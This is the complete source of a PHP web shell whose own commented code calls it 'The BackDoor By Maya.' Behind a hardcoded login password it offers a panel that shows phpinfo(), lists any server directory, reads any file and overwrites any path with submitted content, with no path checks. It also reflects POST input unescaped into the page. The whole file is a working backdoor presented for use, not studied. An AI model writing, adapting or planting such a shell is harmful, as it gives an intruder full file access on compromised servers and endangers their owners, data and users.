<?php
//session_start();
//print_r($_SESSION);
session_start();

//登录密码
define("LOGIN_PWD","11221122");
//检测是否登录
if($_GET['act']=="login"):
        if($_POST['pwd']==LOGIN_PWD):
                $_SESSION['account']=true;
        endif;
endif;
//去除转义
function Change(&$dat){
        if(!is_array($dat))return;
        $keys=array_keys($dat);
        for($i=0;$i<count($dat);$i++):
                if(is_string($dat[$keys[$i]])){
                        $dat[$keys[$i]]=stripslashes($dat[$keys[$i]]);
                }
        endfor;
}
$magic=@get_magic_quotes_gpc();
if($magic || @ini_get("magic_quotes_sybase")){
        Change($_POST);
        Change($_GET);
}
//----------------------------此处禁用，非Apache不能使用
/*
if(LOGIN_TYPE=="401"):
        if(!isset($_SERVER['PHP_AUTH_USER'])):
                //header("Content-Type:text/html;charset=utf-8");
                header('WWW-Authenticate: Basic realm="The BackDoor By Maya."');
                header('HTTP/1.0 401 Unauthorized');
                exit('需要登录才能继续操作！');
        else:
                if($_SERVER['PHP_AUTH_USER']==LOGIN_NAME && $_SERVER['PHP_AUTH_PW']==LOGIN_PWD):
                else:
                        exit('错误的用户名或密码');
                endif;
        endif;
endif;
*/
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
<style type="text/css">
body,select,input,textarea{font-size: 12px;color: #333;font-family: 微软雅黑;}
form,li,ul{list-style:none;padding:0;margin:0;}
a{color: green;text-decoration: underline;}
.tb{ margin-top:10px;}
.tb thead{background-color: #f3f3f3;}
.tb th{font-weight: bold;border: 1px solid #bbb;border-bottom:0px none;padding: 0 10px;height:26px;line-height: 26px;}
.tb td{border: 1px solid #bbb;padding: 0 10px;height:26px;line-height: 26px;}
</style>
<script language="javascript">
var _=function(o){return document.getElementById(o);}
</script>
</head>
<body>
<?php
if(!isset($_SESSION['account'])):
?>
<table width="230" border="0" align="center" cellpadding="0" cellspacing="0" class="tb">
        <thead>
                <tr>
                        <th align="left">请先登录</th>
                </tr>
        </thead>
        <tbody>
                <tr>
                        <td>
                        <form method="post" action="?act=login">
                                密码：
                                <input name="pwd" type="text" id="pwd" size="10" maxlength="10" />
                                <input type="submit" name="sub" id="sub" value="登录" />
                        </form>
                        <?php
                                if($_POST && $_POST['pwd']!=LOGIN_PWD):
                                        echo "<i style='color:red'>密码不正确</i>";
                                endif;
                        ?>
                        </td>
                </tr>
        </tbody>
</table>
<?php
exit();
endif;

?>
<?php
if($_GET['act']=="phpinfo"){
	phpinfo();	
}
?>
<table width="600" border="0" align="center" cellpadding="0" cellspacing="0" class="tb">
        <thead>
                <tr>
                        <th align="left">控制面板</th>
                </tr>
        </thead>
        <tbody>
                <tr>
                        <td><a href="?act=editFile">修改文件</a> <a href="?act=phpinfo" target="_blank">服务端信息查看</a></td>
                </tr>
        </tbody>
</table>

<?php
if($_GET['act']=="editFile"):
?>
<script>
function editFilePathChange(){
	//if(_("save_file_path").value==""){
		_("save_file_path").value=_("edit_file_path").value;
	//}
}
function saveFile(){
	if(!confirm("确定要保存吗？保存后原来的文件无法恢复！！为了避免保存失败请将内容先复制一下"))return;
	_("file_content").value=_("file_content_textarea").value;
	_("file_form").action="?act=editFile&saveFile=true";
	_("file_form").submit();
}
function showFileList(){
	var _w=window.open("?act=showFileList","w","width=640,height=500");	
	//window.showModalDialog("?act=showFileList");	
}
</script>
<table width="600" border="0" align="center" cellpadding="0" cellspacing="0" class="tb">
        <thead>
                <tr>
                        <th align="left">填写 文件地址 与 保存路径</th>
                </tr>
        </thead>
        <tbody>
                <tr>
                        <td><form method="post" action="?act=editFile&amp;openFile=true" id="file_form">
                        
                                文件地址：
                        <input value="<?=$_POST['edit_file_path']?>" name="edit_file_path" type="text" id="edit_file_path" size="30" onchange="editFilePathChange();" />
                        <a href="javascript:void(0);" onclick="showFileList();">查看目录</a> 相对目录 如：../admin/readme.txt<br />
                        保存路径：
                        <input value="<?=$_POST['save_file_path']?>" name="save_file_path" type="text" id="save_file_path" size="30" />
                        同上<br />
                        相关操作：
                        <input type="submit" name="button" id="button" value="调出文件" />
                        <input type="button" value="保存文件" onclick="saveFile();" />
                        <input type="hidden" name="file_content" id="file_content" />
                        </form></td>
                </tr>
        </tbody>
</table>
<?php
endif;
?>
<?php
if($_GET['act']=="editFile" && $_GET['openFile']=="true"):
?>
<table width="600" border="0" align="center" cellpadding="0" cellspacing="0" class="tb">
        <thead>
                <tr>
                        <th align="left">文件内容</th>
                </tr>
        </thead>
        <tbody>
                <tr>
                        <td >
<?php
if(!file_exists($_POST['edit_file_path'])){
        echo "文件不存在！";
}else{
        $content=htmlspecialchars(file_get_contents($_POST['edit_file_path']));
}
?>
<textarea id="file_content_textarea" style="width: 100%;height: 300px; margin:10px 0;outline:0px none;resize:none;"><?=$content?></textarea>                        
                        </td>
                </tr>
        </tbody>
</table>
<?php
endif;
?>
<?php
if($_GET['act']=="editFile" && $_GET['saveFile']=="true"):
$status=file_put_contents($_POST['save_file_path'],$_POST['file_content']);
?>
<table width="600" border="0" align="center" cellpadding="0" cellspacing="0" class="tb">
        <thead>
                <tr>
                        <th align="left">文件操作状态</th>
                </tr>
        </thead>
        <tbody>
                <tr>
                        <td ><?php
                        if($status===false):
				echo "保存失败";
			else:
				echo "保存成功";
			endif;
			?></td>
                </tr>
        </tbody>
</table>
<?php
endif;
?>

<?php
if($_GET['act']=="showFileList"):
$baseDir=$_GET['baseDir']=="" ? "./" : $_GET['baseDir'];
$dir=dir($baseDir);
?>
<script>
function setPath(path){
	var w=window.opener;
	w._("edit_file_path").value=path;
	w._("save_file_path").value=path;
	window.close();
}
</script>
<table width="600" border="0" align="center" cellpadding="0" cellspacing="0" class="tb">
        <thead>
                <tr>
                        <th align="left">文件列表</th>
                </tr>
        </thead>
        <tbody>
                <tr>
                        <td >
                        <ul>
                        <?php
                        while(($f=$dir->read())):
				$f_path=is_dir($baseDir.$f) ? $f."/" : $f;
				$new_path=$baseDir.$f_path;
				if($f==".")$new_path="./";
				$href=is_dir($baseDir.$f) ? "?act=showFileList&baseDir=".$new_path : "#" ;
			?>
                        <li>
                        <a target="_self" href="<?=$href?>" <?php if(is_dir($baseDir.$f)){}else{
				echo 'onclick="setPath(\''.$new_path.'\')"';	
			}?>>
                        <?php if($f===".")$f="原始目录";?>
                        <?php if($f==="..")$f="上层目录";?>
			<?=$f?>
                        </a>
                        </li>
			<?php
			endwhile;
			?>
                        </ul>
                        </td>
                </tr>
        </tbody>
</table>
<?php
endif;
?>

</body>
</html>

